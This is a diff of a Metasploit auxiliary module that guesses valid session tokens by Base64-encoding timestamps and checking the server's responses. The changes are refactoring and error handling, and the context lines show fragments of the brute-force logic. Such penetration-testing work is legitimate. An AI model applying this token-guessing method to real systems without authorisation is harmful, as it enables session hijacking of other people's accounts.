@@ -91,7 +91,6 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(_ip)
     # Calculate dates
-    today = Date.today.strftime('%m/%d/%Y')
     days = datastore['DAYS']
     if days < 0
       days = 0
@@ -111,7 +110,7 @@ class MetasploitModule < Msf::Auxiliary
       (0..hrs.to_i).reverse_each do |hours|
         (0..min.to_i).reverse_each do |minutes|
           (0..sec.to_i).reverse_each do |seconds|
-            timestamp = "#{date} #{'%02d' % hours}:#{'%02d' % minutes}:#{'%02d' % seconds}"
+            timestamp = "#{date} #{format('%.2d', hours)}:#{format('%.2d', minutes)}:#{format('%.2d', seconds)}"
             token_queue << Base64.strict_encode64(timestamp).strip
           end
           sec = 59
@@ -134,17 +133,19 @@ class MetasploitModule < Msf::Auxiliary
           }
         })
 
-        return if !res
+        return false if !res
 
         if res.code == 200 && (!res.body.to_s.include? 'Session Expired')
           print_good("#{rhost}:#{rport} - Valid token found: '#{token}'")
-          return
+          return true
         else
           vprint_error("#{rhost}:#{rport} - Failed: '#{token}'")
         end
       end
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+      fail_with(Failure::Unreachable, "#{peer} - Could not connect to host")
     rescue ::Timeout::Error, ::Errno::EPIPE
+      fail_with(Failure::Unreachable, "#{peer} - Connection timeout")
     end
   end
 end
